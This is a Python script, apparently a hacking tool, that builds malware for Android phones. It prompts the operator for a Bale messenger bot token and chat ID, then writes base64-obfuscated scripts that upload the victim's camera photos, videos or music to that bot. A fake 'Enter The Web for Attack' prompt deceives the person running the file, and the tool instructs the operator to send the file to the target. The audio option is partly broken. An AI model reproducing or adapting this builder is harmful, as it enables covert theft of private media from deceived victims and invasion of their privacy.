#!/usr/bin/env python3
from colorama import Fore,Style
from time import sleep
import requests
import base64
import sys
import os

print("")
sleep(2)
os.system("clear" or "cls")
print("")

banner = f'''
{Fore.LIGHTCYAN_EX}• • • • • • • • • • • • • • • • • • • • • • • • • • • • • •
    ╔══════════════════════════════════════════════╗
    ║                                              ║
    ║     ✦  █▀▀ █▀▀█ █░░ █░░ █▀▀ █▀▀█ █░░█  ✦   ║
    ║     ✦  █▀▀ █▄▄█ █░░ █░░ █▀▀ █▄▄▀ █▄▄█  ✦   ║
    ║                                              ║
    ║     ════════✦•✦•✦•✦•✦•✦•✦════════          ║
    ║                                              ║
    ║       📷  Image  •  Extract & Send          ║
    ║       📹  Video  •  Extract & Send          ║
    ║       🎵  Music  •  Extract & Send          ║
    ║                                              ║
    ║     ════════✦•✦•✦•✦•✦•✦•✦════════          ║
    ║                                              ║
    ║         ⚡  Powered by Python  ⚡            ║
    ║         🔐  Encrypted Output  🔐            ║
    ║         🎯  Target Access Tool 🎯           ║
    ║                                              ║
    ╚══════════════════════════════════════════════╝
• • • • • • • • • • • • • • • • • • • • • • • • • • • • • •
{Style.RESET_ALL}
'''
print(banner, end="")

print(Style.BRIGHT+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTCYAN_EX+"1"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Image Hacker")
print(Style.BRIGHT+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTCYAN_EX+"2"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Video Hacker")
print(Style.BRIGHT+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTCYAN_EX+"3"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Music Hacker")
print(Style.BRIGHT+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTCYAN_EX+"0"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Exit Script\n")
select = input(Fore.LIGHTGREEN_EX+"$ ["+Style.BRIGHT+"Enter Your Number"+Fore.LIGHTGREEN_EX+"] $"+Fore.LIGHTGREEN_EX+" > "+Fore.LIGHTCYAN_EX)
print("")
sleep(1)

if select == "1":
    token = input(Fore.LIGHTYELLOW_EX+"TOKEN BOT : "+Fore.LIGHTCYAN_EX)
    chat_id = input(Fore.LIGHTYELLOW_EX+"ID : "+Fore.LIGHTCYAN_EX)
    
    code = f'''from colorama import Fore,Style
from time import sleep
import requests
import base64
import os

TOKEN = "{token}"
CHAT_ID = "{chat_id}"
Camera = "/storage/emulated/0/DCIM/Camera"
files = os.listdir(Camera)
print("")

web = input("Enter The Web for Attack : ")

for i in files:
    if i.endswith((".jpg",".png",".jpeg")):
        path = Camera + "/" + i
        
        with open(path, 'rb') as photos:
            requests.post(
                f"https://tapi.bale.ai/bot{{TOKEN}}/sendPhoto",
                data={{"chat_id": CHAT_ID}},
                files={{"photo": photos}}
            )
        print(f"Sending Packet to website Successfully : {{web}}")
        sleep(2)
'''
    
    encoded = base64.b64encode(code.encode()).decode()
    
    final_code = f'''import base64
exec(base64.b64decode("{encoded}").decode())
'''
    
    with open("send_photos.py", "w") as f:
        f.write(final_code)
    sleep(2)
    print("")
    print(Fore.LIGHTGREEN_EX+"Created send_photos.py Successfully")
    sleep(0.5)
    print(Fore.LIGHTGREEN_EX+"Now send the file to the target.")

elif select == "2":
    token = input(Fore.LIGHTYELLOW_EX+"TOKEN BOT : "+Fore.LIGHTCYAN_EX)
    chat_id = input(Fore.LIGHTYELLOW_EX+"ID : "+Fore.LIGHTCYAN_EX)
    
    code = f'''from colorama import Fore,Style
from time import sleep
import requests
import base64
import os

TOKEN = "{token}"
CHAT_ID = "{chat_id}"
GALLERY = "/storage/emulated/0/DCIM/Camera"

files = os.listdir(GALLERY)
print("")

web = input("Enter The Web for Attack : ")

for file in files:
    path = GALLERY + "/" + file

    if file.endswith('.mp4'):
        with open(path, 'rb') as f:
            requests.post(
                f"https://tapi.bale.ai/bot{{TOKEN}}/sendVideo",
                data={{"chat_id": CHAT_ID}},
                files={{"video": f}}
            )
        print(f"Sending Packet to website Successfully : {{web}}")
        sleep(2)
    '''
    encoded = base64.b64encode(code.encode()).decode()
    
    final_code = f'''import base64
exec(base64.b64decode("{encoded}").decode())
'''
    
    with open("send_videos.py", "w") as f:
        f.write(final_code)
    sleep(2)
    print("")
    print(Fore.LIGHTGREEN_EX+"Created send_videos.py Successfully")
    sleep(0.5)
    print(Fore.LIGHTGREEN_EX+"Now send the file to the target.")
elif select == "3":
    token = input(Fore.LIGHTYELLOW_EX+"TOKEN BOT : "+Fore.LIGHTCYAN_EX)
    chat_id = input(Fore.LIGHTYELLOW_EX+"ID : "+Fore.LIGHTCYAN_EX)
    
    code = '''from colorama import Fore,Style
from time import sleep
import requests
import base64
import os
TOKEN = "{token}"
CHAT_ID = "{chat_id}"
MUSIC = "/storage/emulated/0/Music"
files = os.listdir(GALLERY)
print("")

web = input("Enter The Web for Attack : ")

for file in files:
    path = GALLERY + "/" + file

    if file.endswith('.mp4'):
        with open(path, 'rb') as f:
            requests.post(
                f"https://tapi.bale.ai/bot{{TOKEN}}/sendAudio",
                data={{"chat_id": CHAT_ID}},
                files={{"video": f}}
            )
        print(f"Sending Packet to website Successfully : {{web}}")
        sleep(2)
    '''
    encoded = base64.b64encode(code.encode()).decode()
    
    final_code = f'''import base64
exec(base64.b64decode("{encoded}").decode())
'''
    
    with open("send_audio.py", "w") as f:
        f.write(final_code)
    sleep(2)
    print("")
    print(Fore.LIGHTGREEN_EX+"Created send_videos.py Successfully")
    sleep(0.5)
    print(Fore.LIGHTGREEN_EX+"Now send the file to the target.")
elif select == "0":
    sleep(1)
    print(Fore.LIGHTRED_EX+"By By (:")
    print("")
    exit()
else:
    print(Fore.LIGHTRED_EX+"Error: Please enter the correct option.")
    print("")